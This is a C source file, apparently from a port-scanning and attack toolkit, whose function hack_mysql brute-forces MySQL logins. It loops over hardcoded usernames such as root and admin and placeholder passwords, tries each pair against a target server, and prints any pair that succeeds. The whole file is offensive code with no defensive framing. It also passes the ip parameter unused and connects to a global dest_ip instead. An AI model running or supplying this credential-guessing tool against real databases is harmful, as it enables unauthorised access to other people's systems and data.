/*
 ============================================================================
 Name        : Hack_MySQL.c
 Author      : L.
 Version     : 1.0.5
 Copyright   : GNU General Public License v3.0
 Description :
 ============================================================================
 */

#include "TCP_Syn_Port_Scanner_Minimal.h"

int hack_mysql(in_addr_t ip, int port, int type){
	int contUsersFound=0;
	switch(type){
	case MYSQL_BRUTE_FORCE:;
		double totalComb=0.0;
		int cont=1;
		char usernames[USERNAMES][128]={"root",
				"mysql",
				"admin"};
		char passwords[PASSWORDS][128]={"pass1",
				"pass2",
				"pass3"};
		totalComb=USERNAMES*PASSWORDS;
		MYSQL *conn=NULL;
		for(int i=0;i<USERNAMES;i++){
			for(int j=0;j<PASSWORDS;j++,cont++){
				if(conn==NULL) conn=mysql_init(NULL);
				if(conn==NULL){
					show_error("", errno);
					return RETURN_ERROR;
				}
				printf("\r%sPercentage completed: %s%.4lf%% (%s/%s)               ",WHITE,HGREEN, (double)((cont/totalComb)*100.0),usernames[i], passwords[j]);
				fflush(stdout);
				usleep(BRUTE_FORCE_DELAY);
				if(mysql_real_connect(conn, inet_ntoa(*((struct in_addr*)&dest_ip.s_addr)), usernames[i], passwords[j], "sys", port, NULL, 0) != NULL){
					show_error("", errno);
					printf("%s",HRED);
					printf("\n\nLoging successfull with user: %s, password: %s.\n\n",usernames[i], passwords[j]);
					mysql_close(conn);
					conn=NULL;
					contUsersFound++;
				}
			}
		}
		mysql_close(conn);
		break;
	default:
		break;
	}
	printf("%s",DEFAULT);
	return contUsersFound;
}
